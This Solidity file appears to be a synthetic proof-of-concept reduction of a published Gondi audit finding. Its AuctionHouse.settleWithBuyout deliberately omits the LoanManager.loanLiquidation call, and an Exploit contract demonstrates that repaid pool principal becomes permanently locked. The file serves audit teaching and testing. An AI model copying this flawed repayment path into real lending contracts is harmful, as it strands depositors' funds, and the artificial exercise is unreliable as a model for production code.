// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Gondi — [H-06] settleWithBuyout() does not call LoanManager.loanLiquidation()
    (Code4rena 2024-04-gondi, finding #35208, reporter minhquanym).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: settleWithBuyout repays other tranche lenders with
    asset.safeTransferFrom(buyer, lender, owed) and then calls
    MultiSourceLoan.loanLiquidated, but NEVER calls
    LoanManager.loanLiquidation() on pool lenders. Pool outstanding /
    cash accounting stays stale, so returned principal is unclaimable
    by depositors (locked funds).

    Blamed path: the repay loop that transfers to lenders without a
    LoanManager hook (verbatim shape of AuctionWithBuyoutLoanLiquidator).
//////////////////////////////////////////////////////////////////////////*/

library SafeTransferLib {
    function safeTransfer(MockERC20 token, address to, uint256 amount) internal {
        require(token.transfer(to, amount), "xfer");
    }

    function safeTransferFrom(MockERC20 token, address from, address to, uint256 amount) internal {
        require(token.transferFrom(from, to, amount), "xferFrom");
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal MultiSourceLoan surface used by settleWithBuyout.
contract MultiSourceLoanStub {
    function loanLiquidated(uint256, /*loanId*/ bytes32 /*loanHash*/) external pure {}
}

/// @notice Reduced Gondi Pool (LoanManager). loanLiquidation updates cash + outstanding.
contract Pool {
    MockERC20 public immutable asset;

    uint256 public cashAccounting; // only updated via deposit / loanLiquidation
    uint256 public outstanding; // principal currently on loan
    uint256 public totalSupply;
    mapping(address => uint256) public shares;

    constructor(MockERC20 _asset) {
        asset = _asset;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 s) {
        s = assets; // 1:1 for the reduction
        asset.transferFrom(msg.sender, address(this), assets);
        cashAccounting += assets;
        totalSupply += s;
        shares[receiver] += s;
    }

    /// @notice Book a loan: cash leaves accounting into outstanding.
    function bookLoan(uint256 principal) external {
        require(cashAccounting >= principal, "cash");
        cashAccounting -= principal;
        outstanding += principal;
        // principal already sits with the borrower / loan system in production;
        // here we burn it from the pool balance so only repayment restores cash.
        asset.transfer(msg.sender, principal);
    }

    /// @notice Correct liquidation hook — would make repaid principal claimable.
    function loanLiquidation(
        uint256, /*_loanId*/
        uint256 _principalAmount,
        uint256, /*_apr*/
        uint256, /*_*/
        uint256, /*_protocolFee*/
        uint256 _received,
        uint256 /*_startTime*/
    ) external {
        require(outstanding >= _principalAmount, "out");
        outstanding -= _principalAmount;
        cashAccounting += _received;
        // tokens are expected to already be (or arrive) on this contract
    }

    /// @notice Withdraw uses cashAccounting only (not raw balanceOf).
    function withdraw(uint256 assets, address receiver) external returns (uint256 s) {
        require(cashAccounting >= assets, "illiquid");
        s = assets;
        require(shares[msg.sender] >= s, "shares");
        shares[msg.sender] -= s;
        totalSupply -= s;
        cashAccounting -= assets;
        asset.transfer(receiver, assets);
    }

    function lockedUnaccounted() external view returns (uint256) {
        uint256 bal = asset.balanceOf(address(this));
        // tokens present beyond what accounting knows as cash are stuck
        if (bal > cashAccounting) return bal - cashAccounting;
        return 0;
    }
}

/// @notice Reduced AuctionWithBuyoutLoanLiquidator.settleWithBuyout.
contract AuctionHouse {
    using SafeTransferLib for MockERC20;

    struct Tranche {
        address lender;
        uint256 principalAmount;
    }

    struct LoanView {
        Tranche[] tranche;
    }

    struct Auction {
        address asset;
        address loanAddress;
        uint256 loanId;
        bool settled;
    }

    MultiSourceLoanStub public immutable loanContract;
    mapping(uint256 => Auction) public auctions;
    mapping(uint256 => LoanView) private _loans;
    uint256 public nextId = 1;

    constructor(MultiSourceLoanStub _loan) {
        loanContract = _loan;
    }

    function openAuction(address asset, address[] calldata lenders, uint256[] calldata principals)
        external
        returns (uint256 id)
    {
        require(lenders.length == principals.length && lenders.length >= 2, "tranches");
        id = nextId++;
        Tranche[] storage t = _loans[id].tranche;
        for (uint256 i; i < lenders.length; i++) {
            t.push(Tranche(lenders[i], principals[i]));
        }
        auctions[id] = Auction({asset: asset, loanAddress: address(loanContract), loanId: id, settled: false});
    }

    /// @notice Main lender buys out: repays other lenders, liquidates loan record.
    ///         BUG: never calls LoanManager.loanLiquidation on pool lenders.
    function settleWithBuyout(uint256 auctionId) external {
        Auction storage _auction = auctions[auctionId];
        require(!_auction.settled, "settled");
        LoanView storage _loan = _loans[auctionId];

        // Main lender = largest principal tranche.
        uint256 largestTrancheIdx;
        uint256 largestPrincipal;
        for (uint256 i; i < _loan.tranche.length;) {
            if (_loan.tranche[i].principalAmount > largestPrincipal) {
                largestPrincipal = _loan.tranche[i].principalAmount;
                largestTrancheIdx = i;
            }
            unchecked {
                ++i;
            }
        }
        require(msg.sender == _loan.tranche[largestTrancheIdx].lender, "not main");

        MockERC20 asset = MockERC20(_auction.asset);
        // @audit Repay lender but not call LoanManager.loanLiquidation()
        for (uint256 i; i < _loan.tranche.length;) {
            if (i != largestTrancheIdx) {
                // Verbatim repay path: transfer owed to other lenders only.
                uint256 owed = _loan.tranche[i].principalAmount;
                // FIX: if lender is LoanManager, also call loanLiquidation(...)
                // @> VULN: pays the pool without LoanManager.loanLiquidation()
                asset.safeTransferFrom(msg.sender, _loan.tranche[i].lender, owed);
            }
            unchecked {
                ++i;
            }
        }
        MultiSourceLoanStub(_auction.loanAddress).loanLiquidated(_auction.loanId, bytes32(0));
        _auction.settled = true;
    }
}

/// @notice Pool is junior lender. Buyout pays the pool USDC but never
///         loanLiquidation → principal locked out of cashAccounting.
contract Exploit {
    using SafeTransferLib for MockERC20;

    uint256 public constant DEPOSIT = 100e18;
    uint256 public constant POOL_PRINCIPAL = 50e18; // junior tranche
    uint256 public constant MAIN_PRINCIPAL = 100e18; // main lender

    MockERC20 public usdc;
    MultiSourceLoanStub public loanStub;
    Pool public pool;
    AuctionHouse public house;

    uint256 public locked;
    uint256 public poolBalance;
    uint256 public outstandingAfter;
    uint256 public cashAfter;

    constructor() {
        usdc = new MockERC20(); //            nonce 1
        loanStub = new MultiSourceLoanStub(); // nonce 2
        pool = new Pool(usdc); //             nonce 3
        house = new AuctionHouse(loanStub); // nonce 4

        // Fund deposit + main-lender buyout budget into this contract.
        usdc.mint(address(this), DEPOSIT + POOL_PRINCIPAL + MAIN_PRINCIPAL);
        usdc.approve(address(pool), type(uint256).max);
        usdc.approve(address(house), type(uint256).max);
    }

    function run() external {
        // 1. Depositor funds the pool.
        pool.deposit(DEPOSIT, address(this));
        require(pool.cashAccounting() == DEPOSIT, "deposit");

        // 2. Pool books a junior loan (cash → outstanding); principal leaves pool.
        pool.bookLoan(POOL_PRINCIPAL);
        // Capture principal on this contract (simulates loan drawdown hold).
        // bookLoan sent principal to msg.sender (= this).
        require(pool.outstanding() == POOL_PRINCIPAL, "out booked");
        require(pool.cashAccounting() == DEPOSIT - POOL_PRINCIPAL, "cash after book");

        // 3. Open multi-tranche auction: main lender + pool junior.
        address[] memory lenders = new address[](2);
        uint256[] memory principals = new uint256[](2);
        lenders[0] = address(0xB1); // main lender (larger principal)
        lenders[1] = address(pool); // junior = pool
        principals[0] = MAIN_PRINCIPAL;
        principals[1] = POOL_PRINCIPAL;
        // Fund main lender and have them settle — we act as main by using 0xB1 via
        // self-call pattern: set this contract as main lender instead.
        lenders[0] = address(this);
        uint256 id = house.openAuction(address(usdc), lenders, principals);

        // 4. Main lender settles buyout: repays pool principal from own wallet.
        //    loanLiquidation is NEVER called on the pool.
        house.settleWithBuyout(id);

        poolBalance = usdc.balanceOf(address(pool));
        outstandingAfter = pool.outstanding();
        cashAfter = pool.cashAccounting();
        locked = pool.lockedUnaccounted();

        // HARM: pool holds the repaid principal, but outstanding is still full
        // and cashAccounting never rose — depositors cannot withdraw the returned
        // principal (illiquid under accounting rules).
        require(poolBalance >= POOL_PRINCIPAL, "pool received tokens");
        require(outstandingAfter == POOL_PRINCIPAL, "outstanding not cleared");
        require(cashAfter == DEPOSIT - POOL_PRINCIPAL, "cash stale");
        require(locked == POOL_PRINCIPAL, "principal locked unaccounted");

        // Withdraw of remaining cash works; withdrawing the repaid principal reverts.
        uint256 liquid = cashAfter;
        pool.withdraw(liquid, address(this));
        // Attempting to withdraw more would need cashAccounting which is now 0,
        // while locked tokens remain on the pool forever.
        require(pool.cashAccounting() == 0, "cash drained");
        require(pool.lockedUnaccounted() == POOL_PRINCIPAL, "still locked");
        require(usdc.balanceOf(address(pool)) == POOL_PRINCIPAL, "stuck on pool");
    }
}
